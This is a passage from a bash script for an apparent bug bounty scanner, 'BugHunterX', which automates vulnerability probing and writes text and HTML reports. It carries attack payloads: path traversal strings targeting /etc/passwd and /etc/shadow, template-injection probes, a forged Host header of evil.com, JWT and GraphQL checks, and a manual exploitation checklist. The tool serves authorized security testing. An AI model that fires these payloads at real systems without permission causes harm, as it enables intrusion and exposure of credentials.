            --max-time 10 \
            "https://$TARGET" 2>/dev/null)
        if echo "$RESP" | grep -qi "evil.com"; then
            finding "MEDIUM" "Host Header Injection" "https://$TARGET" \
                "Server reflects injected Host header value in response" \
                "curl -sk -I -H 'Host: $payload' https://$TARGET  Response contains evil.com" \
                "Whitelist accepted Host header values."
        fi
    done

    # ── Security Headers ──
    info "Security header analysis..."
    RESPONSE_HEADERS=$(curl -sk -I "https://$TARGET" 2>/dev/null)
    {
        echo "=== Security Header Analysis ==="
        echo "$RESPONSE_HEADERS"
        echo ""
        echo "=== MISSING SECURITY HEADERS ==="
    } > "$OUTPUT_DIR/headers/security/security_headers.txt"

    declare -A SEC_HEADERS
    SEC_HEADERS["Strict-Transport-Security"]="HIGH:HSTS missing — site may be downgraded to HTTP"
    SEC_HEADERS["Content-Security-Policy"]="MEDIUM:CSP missing — XSS attacks harder to mitigate"
    SEC_HEADERS["X-Frame-Options"]="MEDIUM:Clickjacking possible"
    SEC_HEADERS["X-Content-Type-Options"]="LOW:MIME sniffing possible"
    SEC_HEADERS["Referrer-Policy"]="LOW:Referrer leakage possible"
    SEC_HEADERS["Permissions-Policy"]="LOW:Feature policy not set"

    for header in "${!SEC_HEADERS[@]}"; do
        IFS=':' read -r SEV_CODE DESC <<< "${SEC_HEADERS[$header]}"
        if ! echo "$RESPONSE_HEADERS" | grep -qi "^$header:"; then
            echo "[MISSING] $header — $DESC" >> "$OUTPUT_DIR/headers/security/security_headers.txt"
            finding "$SEV_CODE" "Missing Security Header: $header" "https://$TARGET" \
                "$DESC" \
                "curl -sk -I https://$TARGET | grep -i '$header' (not present)" \
                "Add header: $header. See https://securityheaders.com for values."
        fi
    done

    # ── LFI ──
    info "Local File Inclusion testing..."
    LFI_PAYLOADS=(
        "../../../../../../etc/passwd"
        "../../../../etc/shadow"
        "../../windows/win.ini"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "php://filter/convert.base64-encode/resource=/etc/passwd"
        "file:///etc/passwd"
    )
    while IFS= read -r url; do
        for payload in "${LFI_PAYLOADS[@]}"; do
            TEST_URL=$(echo "$url" | qsreplace "$payload" 2>/dev/null)
            RESP=$(curl -sk --max-time 10 "$TEST_URL" 2>/dev/null)
            if echo "$RESP" | grep -qP "root:(x|[^:]+):[0-9]+:[0-9]+:|\[fonts\]"; then
                finding "CRITICAL" "Local File Inclusion Confirmed" "$url" \
                    "LFI with payload: $payload — system file content returned" \
                    "curl -sk '$TEST_URL'  Response contains system file content" \
                    "Never pass user input to file functions. Use allowlists for permitted files."
                break
            fi
        done
    done < "$OUTPUT_DIR/vulnerabilities/lfi/gf_lfi_candidates.txt" 2>/dev/null

    # ── Prototype Pollution ──
    if check_tool ppmap; then
        info "Prototype Pollution testing..."
        head -20 "$OUTPUT_DIR/live/http/status_200.txt" 2>/dev/null | while read -r url; do
            ppmap -url "$url" \
                >> "$OUTPUT_DIR/vulnerabilities/prototype_pollution/ppmap_results.txt" 2>/dev/null
        done
    fi

    # ── SSTI ──
    info "Server-Side Template Injection testing..."
    SSTI_PAYLOADS=(
        "{{7*7}}"
        "\${7*7}"
        "{{7*'7'}}"
        "<%= 7*7 %>"
        "#{7*7}"
    )
    while IFS= read -r url; do
        for payload in "${SSTI_PAYLOADS[@]}"; do
            TEST_URL=$(echo "$url" | qsreplace "$payload" 2>/dev/null)
            RESP=$(curl -sk --max-time 10 "$TEST_URL" 2>/dev/null)
            if echo "$RESP" | grep -qP "\b49\b"; then
                finding "CRITICAL" "SSTI Confirmed" "$url" \
                    "Server-Side Template Injection — template engine evaluated 7*7=49. Payload: $payload" \
                    "curl -sk '$TEST_URL'  Response contains '49'" \
                    "Never pass user input to template engines unsanitized."
                break
            fi
        done
    done < "$OUTPUT_DIR/vulnerabilities/rce/gf_ssti_candidates.txt" 2>/dev/null

    # ── GraphQL ──
    info "GraphQL enumeration..."
    for ep in "/graphql" "/graphiql" "/api/graphql" "/v1/graphql" "/query"; do
        RESP=$(curl -sk --max-time 10 \
            -H "Content-Type: application/json" \
            -d '{"query":"{__schema{types{name}}}"}' \
            "https://$TARGET$ep" 2>/dev/null)
        if echo "$RESP" | grep -qi "__schema\|types\|queryType"; then
            finding "MEDIUM" "GraphQL Introspection Enabled" "https://$TARGET$ep" \
                "GraphQL introspection is enabled — full schema exposed" \
                "curl -sk -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' https://$TARGET$ep" \
                "Disable introspection in production. Add depth/rate limiting."
            echo "https://$TARGET$ep" >> "$OUTPUT_DIR/vulnerabilities/graphql/graphql_endpoints.txt"
        fi
    done

    # ── IDOR ──
    info "IDOR candidate detection..."
    grep -oP 'https?://[^\s"]+[?&/][a-z_-]*=?[0-9]+' \
        "$OUTPUT_DIR/endpoints/ALL_URLS_DEDUPED.txt" 2>/dev/null \
        | sort -u > "$OUTPUT_DIR/vulnerabilities/idor/idor_candidates.txt"
    IDOR_COUNT=$(wc -l < "$OUTPUT_DIR/vulnerabilities/idor/idor_candidates.txt" 2>/dev/null || echo 0)
    if [ "$IDOR_COUNT" -gt 0 ]; then
        finding "INFO" "IDOR Candidates Found" "$TARGET" \
            "$IDOR_COUNT URLs with numeric IDs that may be vulnerable to IDOR" \
            "See $OUTPUT_DIR/vulnerabilities/idor/idor_candidates.txt" \
            "Implement proper authorization checks on every object access."
    fi

    # ── JWT ──
    info "JWT vulnerability checks..."
    while IFS= read -r url; do
        RESP=$(curl -sk --max-time 10 "$url" 2>/dev/null)
        JWT=$(echo "$RESP" | grep -oP 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' | head -1)
        if [ -n "$JWT" ]; then
            HEADER=$(echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq . 2>/dev/null)
            ALG=$(echo "$HEADER" | jq -r '.alg' 2>/dev/null)
            echo "URL: $url | JWT Header: $HEADER" >> "$OUTPUT_DIR/vulnerabilities/auth/jwt/found_jwts.txt"
            if echo "$ALG" | grep -qi "none"; then
                finding "CRITICAL" "JWT Algorithm None" "$url" \
                    "JWT uses 'none' algorithm — signature validation disabled" \
                    "JWT header: $HEADER" \
                    "Reject JWTs with 'none' algorithm. Enforce HS256 or RS256."
            fi
            if echo "$ALG" | grep -qi "HS256"; then
                finding "INFO" "JWT HS256 — Test for Weak Secret" "$url" \
                    "JWT uses HS256 — test for weak/default signing secret" \
                    "jwt_tool with crack mode" \
                    "Use strong random secrets. Consider RS256 instead."
            fi
        fi
    done < "$OUTPUT_DIR/live/http/live_urls.txt" 2>/dev/null
}

phase_nuclei() {
    section "PHASE 10 — NUCLEI AUTOMATED CVE SCANNING"

    if ! check_tool nuclei; then
        warn "Nuclei not installed — skipping"
        return
    fi

    info "Nuclei — Critical & High severity..."
    nuclei \
        -l "$OUTPUT_DIR/live/http/live_urls.txt" \
        -severity critical,high \
        -silent \
        -json \
        -o "$OUTPUT_DIR/vulnerabilities/cve/nuclei_critical_high.json" \
        -rate-limit 50 \
        -bulk-size 25 \
        -concurrency 10 \
        2>/dev/null

    if [ -f "$OUTPUT_DIR/vulnerabilities/cve/nuclei_critical_high.json" ]; then
        while IFS= read -r line; do
            TMPL=$(echo "$line" | jq -r '.template-id' 2>/dev/null)
            SNAME=$(echo "$line" | jq -r '.info.name' 2>/dev/null)
            SEVR=$(echo "$line" | jq -r '.info.severity' 2>/dev/null | tr '[:lower:]' '[:upper:]')
            MURL=$(echo "$line" | jq -r '.matched-at' 2>/dev/null)
            CURL_CMD=$(echo "$line" | jq -r '."curl-command"' 2>/dev/null)
            TAGS=$(echo "$line" | jq -r '.info.tags[]?' 2>/dev/null | tr '\n' ',')
            finding "$SEVR" "Nuclei: $SNAME" "$MURL" \
                "Template: $TMPL | Tags: $TAGS" \
                "${CURL_CMD:-nuclei -t $TMPL -u $MURL}" \
                "$(echo "$line" | jq -r '.info.remediation // "Review nuclei template for remediation guidance"' 2>/dev/null)"
        done < "$OUTPUT_DIR/vulnerabilities/cve/nuclei_critical_high.json"
    fi

    info "Nuclei — Medium severity..."
    nuclei \
        -l "$OUTPUT_DIR/live/http/live_urls.txt" \
        -severity medium \
        -silent \
        -json \
        -o "$OUTPUT_DIR/vulnerabilities/cve/nuclei_medium.json" \
        -rate-limit 30 2>/dev/null

    for tag_group in \
        "cve" \
        "exposure,token,api-key,secret" \
        "misconfig,cors,ssrf" \
        "sqli,xss,lfi,rce" \
        "takeover" \
        "panel,login,admin" \
        "graphql" \
        "jwt" \
        "s3,aws,gcp,azure"; do
        info "Nuclei tag scan: $tag_group..."
        SAFE_TAG=$(echo "$tag_group" | tr ',' '_')
        nuclei \
            -l "$OUTPUT_DIR/live/http/live_urls.txt" \
            -tags "$tag_group" \
            -silent \
            -json \
            -o "$OUTPUT_DIR/vulnerabilities/cve/nuclei_${SAFE_TAG}.json" \
            -rate-limit 20 2>/dev/null
    done

    if check_tool trufflehog; then
        info "TruffleHog secret scanning..."
        trufflehog http \
            --url "https://$TARGET" \
            --json \
            > "$OUTPUT_DIR/js/secrets/trufflehog.json" 2>/dev/null
        TRUFF=$(jq -r '.Raw' "$OUTPUT_DIR/js/secrets/trufflehog.json" 2>/dev/null | head -5)
        if [ -n "$TRUFF" ]; then
            finding "CRITICAL" "TruffleHog Secret Leak" "https://$TARGET" \
                "Active credentials detected by TruffleHog" \
                "trufflehog output: $TRUFF" \
                "Rotate all leaked credentials immediately. Audit git history."
        fi
    fi

    if check_tool s3scanner; then
        info "S3 bucket enumeration..."
        s3scanner scan --bucket "$TARGET" \
            > "$OUTPUT_DIR/vulnerabilities/secrets/s3scanner.txt" 2>/dev/null
        s3scanner scan --bucket "$(echo "$TARGET" | cut -d. -f1)" \
            >> "$OUTPUT_DIR/vulnerabilities/secrets/s3scanner.txt" 2>/dev/null
        if grep -qi "open" "$OUTPUT_DIR/vulnerabilities/secrets/s3scanner.txt" 2>/dev/null; then
            finding "HIGH" "Open S3 Bucket" "$TARGET" \
                "Publicly accessible S3 bucket found" \
                "s3scanner: $(cat "$OUTPUT_DIR/vulnerabilities/secrets/s3scanner.txt")" \
                "Make S3 bucket private. Enable bucket policy and access logging."
        fi
    fi

    ok "Nuclei scanning complete"
}

phase_report() {
    section "PHASE 11 — GENERATING COMPREHENSIVE REPORT"

    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
    END_TIME=$(date +%s)
    ELAPSED=$((END_TIME - START_TIME))
    ELAPSED_HR=$(printf '%02d:%02d:%02d' $((ELAPSED/3600)) $(((ELAPSED%3600)/60)) $((ELAPSED%60)))

    CRIT=$(wc -l < "$OUTPUT_DIR/findings/CRITICAL.txt" 2>/dev/null || echo 0)
    HIGH=$(wc -l < "$OUTPUT_DIR/findings/HIGH.txt" 2>/dev/null || echo 0)
    MED=$(wc -l < "$OUTPUT_DIR/findings/MEDIUM.txt" 2>/dev/null || echo 0)
    LOW=$(wc -l < "$OUTPUT_DIR/findings/LOW.txt" 2>/dev/null || echo 0)
    INFO_C=$(wc -l < "$OUTPUT_DIR/findings/INFO.txt" 2>/dev/null || echo 0)
    SUBS=$(wc -l < "$OUTPUT_DIR/subdomains/MASTER_SUBDOMAINS.txt" 2>/dev/null || echo 0)
    LIVE=$(wc -l < "$OUTPUT_DIR/live/http/live_urls.txt" 2>/dev/null || echo 0)
    URLS=$(wc -l < "$OUTPUT_DIR/endpoints/ALL_URLS_DEDUPED.txt" 2>/dev/null || echo 0)
    JS=$(wc -l < "$OUTPUT_DIR/js/files/js_list.txt" 2>/dev/null || echo 0)
    PORTS=$(wc -l < "$OUTPUT_DIR/ports/naabu/open_ports.txt" 2>/dev/null || echo 0)

    REPORT="$OUTPUT_DIR/BUGHUNTERX_REPORT.txt"
    cat > "$REPORT" << REPORTEOF
╔══════════════════════════════════════════════════════════════════════════╗
║                BugHunterX v${VERSION} — Bug Bounty Recon Report                ║
╚══════════════════════════════════════════════════════════════════════════╝

  Target    : $TARGET
  Date      : $TIMESTAMP
  Duration  : $ELAPSED_HR
  Output    : $OUTPUT_DIR

══════════════════════ EXECUTIVE SUMMARY ══════════════════════

  🔴 CRITICAL : $CRIT
  🟠 HIGH     : $HIGH
  🟡 MEDIUM   : $MED
  🟢 LOW      : $LOW
  🔵 INFO     : $INFO_C

  Subdomains discovered  : $SUBS
  Live hosts             : $LIVE
  Unique URLs            : $URLS
  JS files analyzed      : $JS
  Open ports             : $PORTS

══════════════════════ ALL FINDINGS ══════════════════════════

$(cat "$OUTPUT_DIR/findings/ALL_FINDINGS.txt" 2>/dev/null)

══════════════════════ MANUAL TESTING CHECKLIST ══════════════

□ Test all SQLi candidates with sqlmap --dbs
□ Test XSS candidates in Burp Suite (DOM/stored/reflected)
□ Test IDOR candidates — try sequential/predictable IDs
□ Test 403 pages with 403-bypass tool
□ Test SSRF with Burp Collaborator / interactsh
□ Test GraphQL for batch attacks and field enumeration
□ Review JS endpoints for undocumented APIs
□ Test JWT with jwt_tool — alg:none, weak secret, kid injection
□ Test admin panels for default credentials
□ Review all exposed config files manually
□ Test file upload endpoints for RCE
□ Test password reset for account takeover
□ Test for HTTP Request Smuggling
□ Test for OAuth misconfiguration
□ Check subdomains on cloud providers for takeover
□ Test for race conditions on payment/rate-limit endpoints
□ Check for exposed .git with git-dumper
□ Test 2FA bypass: response manipulation, backup codes

REPORTEOF

    ok "Text report: $REPORT"

    HTML_REPORT="$OUTPUT_DIR/BUGHUNTERX_REPORT.html"
    cat > "$HTML_REPORT" << 'HTMLSTART'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
HTMLSTART

    echo "<title>BugHunterX Report — $TARGET</title>" >> "$HTML_REPORT"

    cat >> "$HTML_REPORT" << 'HTMLSTYLE'
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0e17;color:#c9d1d9;font-family:'Courier New',monospace;font-size:14px;line-height:1.6}
.header{background:linear-gradient(135deg,#1a0a0a,#0d0a1a);border-bottom:2px solid #ff4444;padding:30px;text-align:center}
.title{font-size:2.5em;color:#ff4444;text-shadow:0 0 20px #ff000066;letter-spacing:3px;font-weight:bold}
.subtitle{color:#888;margin-top:8px}
.meta{display:flex;gap:30px;justify-content:center;margin-top:20px;flex-wrap:wrap}
.meta span{background:#111;padding:6px 16px;border:1px solid #333;border-radius:4px;font-size:12px}
.meta span b{color:#4af}
.container{max-width:1400px;margin:0 auto;padding:20px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:15px;margin:20px 0}
.stat{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:20px;text-align:center;transition:.3s}
.stat:hover{transform:translateY(-2px);border-color:#58a6ff}
.stat .num{font-size:2.5em;font-weight:bold}
.stat .lbl{color:#8b949e;font-size:12px;margin-top:4px}
.critical .num{color:#ff4444;text-shadow:0 0 10px #ff444466}
.high .num{color:#ff8c00}
.medium .num{color:#ffd700}
.low .num{color:#4ade80}
.info-s .num{color:#60a5fa}
.section{margin:25px 0}
.section-title{background:#161b22;border-left:4px solid #58a6ff;padding:12px 20px;font-size:1.1em;color:#58a6ff;margin-bottom:15px;letter-spacing:1px}
.finding{background:#0d1117;border:1px solid #30363d;border-radius:6px;margin:10px 0;overflow:hidden}
.finding-header{padding:12px 16px;display:flex;align-items:center;gap:12px;cursor:pointer;user-select:none}
.finding-header:hover{background:#161b22}
.badge{padding:3px 10px;border-radius:12px;font-size:11px;font-weight:bold;letter-spacing:1px}
.badge.CRITICAL{background:#ff000022;color:#ff4444;border:1px solid #ff4444}
.badge.HIGH{background:#ff8c0022;color:#ff8c00;border:1px solid #ff8c00}
.badge.MEDIUM{background:#ffd70022;color:#ffd700;border:1px solid #ffd700}
.badge.LOW{background:#4ade8022;color:#4ade80;border:1px solid #4ade80}
.badge.INFO{background:#60a5fa22;color:#60a5fa;border:1px solid #60a5fa}
.finding-type{color:#e6edf3;font-weight:bold;flex:1}
.finding-body{padding:16px;border-top:1px solid #21262d;display:none}
.finding-body.open{display:block}
.field{margin:8px 0}
.field-label{color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:1px}
.field-value{color:#e6edf3;margin-top:3px;word-break:break-all}
.proof-box{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:10px;margin-top:6px;font-family:monospace;font-size:12px;color:#79c0ff;word-break:break-all;overflow-x:auto}
.url-tag{color:#58a6ff;word-break:break-all}
.fix-box{background:#0f2a1a;border:1px solid #2ea04366;border-radius:4px;padding:10px;margin-top:6px;color:#3fb950}
table{width:100%;border-collapse:collapse;font-size:12px}
th{background:#161b22;color:#58a6ff;padding:8px 12px;text-align:left;border-bottom:1px solid #30363d}
td{padding:6px 12px;border-bottom:1px solid #21262d;word-break:break-all}
tr:hover td{background:#161b2244}
.checklist{list-style:none}
.checklist li{padding:6px 0;border-bottom:1px solid #21262d}
.checklist li::before{content:"☐ ";color:#58a6ff}
footer{text-align:center;padding:20px;color:#444;border-top:1px solid #21262d;margin-top:40px}
</style>
</head>
<body>
HTMLSTYLE

    cat >> "$HTML_REPORT" << HTMLBODY
<div class="header">
  <div class="title">🔍 BugHunterX Report</div>
  <div class="subtitle">Advanced Bug Bounty Recon Framework v${VERSION}</div>
  <div class="meta">
    <span><b>Target:</b> $TARGET</span>
    <span><b>Date:</b> $TIMESTAMP</span>
    <span><b>Duration:</b> $ELAPSED_HR</span>
  </div>
</div>
<div class="container">
<div class="stats">
  <div class="stat critical"><div class="num">$CRIT</div><div class="lbl">🔴 CRITICAL</div></div>
  <div class="stat high"><div class="num">$HIGH</div><div class="lbl">🟠 HIGH</div></div>
  <div class="stat medium"><div class="num">$MED</div><div class="lbl">🟡 MEDIUM</div></div>
  <div class="stat low"><div class="num">$LOW</div><div class="lbl">🟢 LOW</div></div>
  <div class="stat info-s"><div class="num">$INFO_C</div><div class="lbl">🔵 INFO</div></div>
  <div class="stat"><div class="num" style="color:#a78bfa">$SUBS</div><div class="lbl">Subdomains</div></div>
  <div class="stat"><div class="num" style="color:#34d399">$LIVE</div><div class="lbl">Live Hosts</div></div>
  <div class="stat"><div class="num" style="color:#f472b6">$URLS</div><div class="lbl">Endpoints</div></div>
  <div class="stat"><div class="num" style="color:#fb923c">$PORTS</div><div class="lbl">Open Ports</div></div>
</div>
<div class="section">
<div class="section-title">📋 ALL FINDINGS</div>
HTMLBODY

    if [ -f "$OUTPUT_DIR/findings/ALL_FINDINGS.txt" ]; then
        python3 - "$OUTPUT_DIR/findings/ALL_FINDINGS.txt" "$HTML_REPORT" << 'PYEOF'
import sys, html

findings_file = sys.argv[1]
output_file = sys.argv[2]

findings = []
current = {}
with open(findings_file, errors='replace') as f:
    for line in f:
        line = line.strip()
        if line.startswith("SEVERITY"):
            if current:
                findings.append(current)
            current = {"SEVERITY": line.split(":",1)[1].strip()}
        elif ":" in line and any(line.startswith(k) for k in ["TYPE","TIMESTAMP","URL","DETAIL","PROOF","REMEDIATION"]):
            k, v = line.split(":",1)
            current[k.strip()] = v.strip()
if current:
    findings.append(current)

out = []
for i, f in enumerate(findings):
    sev = f.get("SEVERITY","INFO")
    ftype = html.escape(f.get("TYPE","Unknown"))
    url = html.escape(f.get("URL",""))
    detail = html.escape(f.get("DETAIL",""))
    proof = html.escape(f.get("PROOF",""))
    remed = html.escape(f.get("REMEDIATION",""))
    ts = html.escape(f.get("TIMESTAMP",""))
    out.append(f'''
<div class="finding" id="f{i}">
  <div class="finding-header" onclick="toggle('f{i}')">
    <span class="badge {sev}">{sev}</span>
    <span class="finding-type">{ftype}</span>
    <span style="color:#555;font-size:11px">{ts}</span>
  </div>
  <div class="finding-body" id="fb{i}">
    <div class="field"><div class="field-label">Affected URL</div><div class="field-value url-tag">{url}</div></div>
    <div class="field"><div class="field-label">Detail</div><div class="field-value">{detail}</div></div>
    <div class="field"><div class="field-label">Proof / Reproduction</div><div class="proof-box">{proof}</div></div>
    <div class="field"><div class="field-label">Remediation</div><div class="fix-box">{remed}</div></div>
  </div>
</div>''')

with open(output_file, 'a') as f:
    f.write('\n'.join(out))
PYEOF
    fi

    cat >> "$HTML_REPORT" << 'HTMLFOOT'
</div>
<div class="section">
<div class="section-title">✅ MANUAL TESTING CHECKLIST</div>
<ul class="checklist">
<li>Test all SQLi candidates with sqlmap -u "URL" --dbs --batch --level=3</li>
<li>Test XSS candidates in Burp Suite (DOM/Stored/Reflected/Blind)</li>
<li>Test IDOR — modify numeric IDs, UUIDs, usernames in API calls</li>
<li>Bypass 403 pages: X-Original-URL header, path traversal tricks</li>
<li>Test SSRF with Burp Collaborator or interactsh OOB DNS</li>
<li>Test GraphQL: introspection, batch attacks, field enumeration</li>
<li>Review JS endpoints for undocumented/internal APIs</li>
<li>Test JWT with jwt_tool: alg:none, weak secret brute force, kid injection</li>
<li>Test admin panels for default credentials (admin:admin)</li>
<li>Test file upload for RCE: double extension, polyglot, null byte</li>
<li>Test password reset flow: token entropy, host header poisoning</li>
<li>Test OAuth: state CSRF, open redirect in redirect_uri</li>
<li>Test HTTP Request Smuggling with Burp HTTP Request Smuggler</li>
<li>Test for race conditions on payment/voting/rate-limit endpoints</li>
<li>Check for exposed .git with git-dumper</li>
<li>Test 2FA bypass: response manipulation, backup codes, rate limit</li>
</ul>
</div>
</div>
<footer>BugHunterX v3.0 — Authorized Bug Bounty Testing Only</footer>
<script>
function toggle(id){
  var idx = id.replace('f','');
  var b = document.getElementById('fb'+idx);
  if(b) b.classList.toggle('open');
}
document.querySelectorAll('.badge.CRITICAL,.badge.HIGH').forEach(function(el){
  var body = el.closest('.finding').querySelector('.finding-body');
  if(body) body.classList.add('open');
});
</script>
</body>
</html>
HTMLFOOT

    ok "HTML report: $HTML_REPORT"
}

show_menu() {
    echo -e "${BOLD}${CYAN}  Select Scan Mode:${NC}"
    echo ""
    echo -e "  ${LRED}[1]${NC} ${BOLD}Full Scan${NC}          — All 11 phases (Recommended)"
    echo -e "  ${YELLOW}[2]${NC} Quick Recon        — Subdomain + Live hosts + Headers"
    echo -e "  ${YELLOW}[3]${NC} Vuln Scan Only      — Recon + vuln + nuclei"
    echo -e "  ${GREEN}[4]${NC} JS Analysis Only    — JS secrets + endpoints"
    echo -e "  ${CYAN}[5]${NC} Subdomain Takeover  — Takeover check only"
    echo -e "  ${BLUE}[6]${NC} Install All Tools   — Install community tools"
    echo -e "  ${GRAY}[7]${NC} Exit"
    echo ""
    echo -n -e "  ${YELLOW}Choice [1-7]: ${NC}"
    read -r CHOICE
}

main() {
    banner
    detect_env

    echo -e "${LRED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║           ⚠  LEGAL AUTHORIZATION REQUIRED  ⚠               ║"
    echo "  ║  Only test targets in authorized bug bounty programs.        ║"
    echo "  ║  Unauthorized testing violates the CFAA and is illegal.      ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -n -e "  Type ${GREEN}I_HAVE_PERMISSION${NC} to confirm authorization: "
    read -r CONFIRM
    if [ "$CONFIRM" != "I_HAVE_PERMISSION" ]; then
        echo -e "${RED}[!] Confirmation not given. Exiting.${NC}"
        exit 1
    fi

    show_menu

    if [ "$CHOICE" = "6" ]; then
        install_tools
        exit 0
    fi
    [ "$CHOICE" = "7" ] && exit 0

    echo ""
    echo -n -e "  ${CYAN}Target domain (e.g. example.com): ${NC}"
    read -r TARGET
    [ -z "$TARGET" ] && echo -e "${RED}[!] No target${NC}" && exit 1

    TARGET=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')

    TS=$(date +%Y%m%d_%H%M%S)
    OUTPUT_DIR="$HOME/bugbounty_results/${TARGET}_${TS}"
    create_dirs

    export GOPATH="$HOME/go"
    export PATH="$PATH:$GOPATH/bin:$HOME/.local/bin"

    echo ""
    echo -e "  ${GREEN}Target  :${NC} $TARGET"
    echo -e "  ${GREEN}Output  :${NC} $OUTPUT_DIR"
    echo -e "  ${GREEN}Started :${NC} $(date)"
    echo ""

    case "$CHOICE" in
        1)
            phase_passive_recon
            phase_subdomain_enum
            phase_live_hosts
            phase_port_scan
            phase_endpoint_discovery
            phase_js_analysis
            phase_param_discovery
            phase_subdomain_takeover
            phase_vuln_scan
            phase_nuclei
            phase_report
            ;;
        2)
            phase_passive_recon
            phase_subdomain_enum
            phase_live_hosts
            phase_report
            ;;
        3)
            phase_passive_recon
            phase_subdomain_enum
            phase_live_hosts
            phase_endpoint_discovery
            phase_param_discovery
            phase_vuln_scan
            phase_nuclei
            phase_report
            ;;
        4)
            phase_js_analysis
            phase_report
            ;;
        5)
            phase_subdomain_enum
            phase_subdomain_takeover
            phase_report
            ;;
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            exit 1
            ;;
    esac

    CRIT=$(wc -l < "$OUTPUT_DIR/findings/CRITICAL.txt" 2>/dev/null || echo 0)
    HIGH=$(wc -l < "$OUTPUT_DIR/findings/HIGH.txt" 2>/dev/null || echo 0)
    MED=$(wc -l < "$OUTPUT_DIR/findings/MEDIUM.txt" 2>/dev/null || echo 0)

    echo ""
    echo -e "${LGREEN}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${LGREEN}║           ✅  SCAN COMPLETE — $TARGET${NC}"
    echo -e "${LGREEN}║  Text   : $OUTPUT_DIR/BUGHUNTERX_REPORT.txt${NC}"
    echo -e "${LGREEN}║  HTML   : $OUTPUT_DIR/BUGHUNTERX_REPORT.html${NC}"
    echo -e "${LGREEN}║  Findings: $OUTPUT_DIR/findings/ALL_FINDINGS.txt${NC}"
    echo -e "${LGREEN}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${LRED}🔴 Critical: $CRIT${NC}  ${YELLOW}🟠 High: $HIGH${NC}  ${YELLOW}🟡 Medium: $MED${NC}"
    echo ""
}

main "$@"
